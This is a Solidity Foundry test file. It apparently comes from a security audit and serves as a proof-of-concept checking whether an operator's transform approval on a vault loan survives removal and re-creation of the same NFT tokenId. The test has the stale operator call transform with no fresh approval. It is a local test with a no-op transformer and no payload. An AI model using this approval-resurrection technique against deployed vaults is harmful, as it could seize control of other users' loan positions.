// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {V4VaultLocalBase} from "test/vault/support/V4VaultLocalBase.sol";
import {IVault} from "src/vault/interfaces/IVault.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/// @notice No-op transformer: any call succeeds, moves nothing.
/// @dev Stands in for "any allowlisted transformer" — the point is the CALLER's
///      authority, not what the transformer does.
contract NoopTransformer {
    fallback() external {}
}

/// @notice TRACK 1 PoC: stale approveTransform resurrection across remove/re-create.
/// Invariant: remove(tokenId) must revoke transform authority over that loan.
/// Falsifier: if the stale operator's transform REVERTS, the invariant holds — kill the lead.
/// Run: forge test --match-contract StaleApprovalPoC -vvv
contract StaleApprovalPoC is V4VaultLocalBase {
    NoopTransformer internal noop;
    address internal operator = makeAddr("operator");

    function setUp() public override {
        super.setUp();
        noop = new NoopTransformer();
        vault.setTransformer(address(noop), true);
        _deposit(lender, 1_000_000 ether);
    }

    function test_staleApprovalResurrected() public {
        uint256 tokenId = _createLoan(1e12);

        // borrower approves operator, then removes the debt-free loan
        vm.prank(borrower);
        vault.approveTransform(tokenId, operator, true);
        vm.prank(borrower);
        vault.remove(tokenId, borrower, "");

        // NFT is back with borrower; re-create the SAME tokenId as the same owner
        IERC721 pm = IERC721(address(positionManager));
        vm.startPrank(borrower);
        pm.approve(address(vault), tokenId);
        vault.create(tokenId, borrower);
        vm.stopPrank();

        // stale operator tries to transform with NO fresh approval
        vm.prank(operator);
        try vault.transform(tokenId, address(noop), "") returns (uint256) {
            // INVARIANT BROKEN: stale approval is live again
            assertTrue(true, "STALE APPROVAL RESURRECTED");
        } catch {
            // invariant holds — kill Track 1
            assertTrue(false, "track1 killed: stale transform reverted");
        }
    }
}
